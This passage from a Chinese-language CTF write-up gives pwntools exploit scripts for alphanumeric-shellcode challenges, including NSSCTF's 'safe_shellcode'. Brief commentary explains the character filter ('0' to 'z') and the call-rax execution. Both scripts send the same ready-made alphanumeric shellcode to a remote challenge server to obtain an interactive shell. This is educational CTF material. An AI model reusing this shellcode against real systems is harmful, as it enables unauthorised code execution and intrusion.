shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.send(shellcode)  # sendline() 的 \n 可能会破坏字符检查，应该使用 send()
    # io.recvuntil(b"I Can't Read This!")
    io.interactive()

if __name__ == "__main__":
    main()
```

然后有一个很类似的题目：

[nss ctf 题目链接 safe_shellcode](https://www.nssctf.cn/problem/2933)

这个题目它直接把伪代码以 .C 发下来了，有 `if(buf[i]<'0'||buf[i]>'z')` 的 判断，从 '0' 到 'z'，而且还是 call rax，所以 payload 都和上面的一模一样。

```
# written by Sonnety
from pwn import *
context.arch="amd64"

host = "node5.anna.nssctf.cn"
port = 23022
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

def main():
    io=remote(host,port)
    io.send(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()
```
